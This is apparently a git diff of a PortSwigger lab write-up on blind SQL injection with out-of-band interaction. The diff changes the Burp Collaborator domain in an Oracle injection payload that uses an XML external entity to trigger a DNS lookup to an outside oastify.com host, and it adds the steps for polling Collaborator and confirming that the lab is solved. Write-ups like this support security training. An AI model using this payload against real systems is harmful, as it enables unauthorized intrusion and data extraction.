@@ -28,7 +28,7 @@ Request captured -
 
 ![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/50679058-e287-42be-ae95-afafa4239c9f)
 
-Then click on copy to clipbord option = `dxelsktl4a73xfpmfkhbfxj6fxlo9ex3.oastify.com` we need paste it in the payload which we are going to do.
+Then click on copy to clipbord option = `hsdsl3chnluavy0asy6vodz1ys4js9gy.oastify.com` we need paste it in the payload which we are going to do.
 
 Since we are unsure of the database we are working with, we attempt every payload listed on DNS lookup for every database.
 
@@ -43,7 +43,7 @@ SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>'' || (SELECT
 Then query will be changed by pasting the external  domain provided by collaborator would look like this
 
 ```sql
-SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' ' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "dxelsktl4a73xfpmfkhbfxj6fxlo9ex3.oastify.com/"> %remote;]>'),'/l') FROM dual)--
+SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' ' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "hsdsl3chnluavy0asy6vodz1ys4js9gy.oastify.com/"> %remote;]>'),'/l') FROM dual)--
 ```
 
 ![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/c71e3347-c20a-4269-8930-999d6ca7b6d9)
@@ -51,6 +51,17 @@ SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' ' || (SELEC
 Then ctrl+u to encode the payload.
 
 ![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/395341c4-9d93-4f1f-8cba-c682b68f4261)
+
+Then go to  collaborator and press poll button.
+
+![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/92cf7b00-44c5-40bb-b04b-71145a972b86)
+
+Lab solved
+
+![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/f0f94479-d1d3-4a46-8feb-9d7fec62c9ce)
+
+
+
 
 
 
